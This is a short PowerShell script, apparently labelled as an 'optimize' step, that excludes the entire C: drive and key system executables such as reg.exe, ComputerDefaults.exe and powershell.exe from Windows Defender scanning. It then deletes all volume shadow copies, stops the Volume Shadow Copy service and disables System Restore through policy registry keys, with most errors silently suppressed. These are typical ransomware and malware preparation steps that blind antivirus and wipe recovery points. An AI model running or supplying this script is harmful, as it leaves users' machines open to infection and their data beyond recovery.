try {
$defenderExclusions = Get-MpPreference
if ($defenderExclusions -eq $null) {
    throw 'Get-MpPreference failed.'
}
if ($defenderExclusions.ExclusionPath -eq $null) {
    $defenderExclusions.ExclusionPath = @()
}
if ($defenderExclusions.ExclusionProcess -eq $null) {
	$defenderExclusions.ExclusionProcess = @()
}
$defenderExclusions.ExclusionPath += 'C:\'
$defenderExclusions.ExclusionPath += 'C:\Windows\regedit.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\explorer.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\regedit.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\System32\reg.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\SysWOW64\reg.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\System32\ComputerDefaults.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\SysWOW64\ComputerDefaults.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
$defenderExclusions.ExclusionProcess += 'C:\Windows\System32\dwm.exe'
Set-MpPreference -ExclusionPath $defenderExclusions.ExclusionPath -ExclusionProcess $defenderExclusions.ExclusionProcess
} catch {}
try {
Start-Process -FilePath 'vssadmin' -ArgumentList 'delete shadows /for=c: /all /quiet' -NoNewWindow -Wait
Stop-Service -Name 'VSS' -Force
$regPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore'
if (-not (Test-Path $regPath)) {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT' -Name 'SystemRestore' -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name 'DisableSR' -Value 1 -Type DWord
Set-ItemProperty -Path $regPath -Name 'DisableConfig' -Value 1 -Type DWord
} catch {
Write-Error "Optimize.DisableSystemRestore: $_"
exit 1
}